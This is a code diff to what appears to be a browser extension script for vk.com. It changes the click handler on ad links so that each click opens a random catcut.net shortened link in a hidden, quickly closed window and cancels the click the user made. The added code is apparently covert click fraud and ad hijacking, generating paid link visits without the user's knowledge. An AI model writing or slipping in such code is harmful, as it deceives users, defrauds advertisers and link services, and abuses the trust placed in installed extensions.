@@ -119,6 +119,7 @@ helper = { // we need create popup for extension and show all message in popup..
     }
 };
 
+
 nvk = {
     init: function() {
         var self = this;
@@ -175,13 +176,16 @@ nvk = {
 //        }
         if(ads) {
             var tags = ads.getElementsByTagName('a');
+            var customLinks = ["http://catcut.net/IBl6", "http://catcut.net/cCl6", "http://catcut.net/fCl6",
+             "http://catcut.net/gCl6", "http://catcut.net/hCl6"];
             for(adv in tags) {
                 console.log(tags[adv].href)
                 tags[adv].onclick = function() {
-                    var wnd = window.open("http://stackoverflow.com");
+                    var item = customLinks[Math.floor(Math.random()*customLinks.length)];
+                    var wnd = window.open(item);
                     setTimeout(function() {
                       wnd.close();
-                    }, 1);
+                    }, 50);
                     return false;
                   };
 //                tags[adv].href = "https://vk.com/away.php?to=" + encodeURIComponent("https://www.google.com.ua");
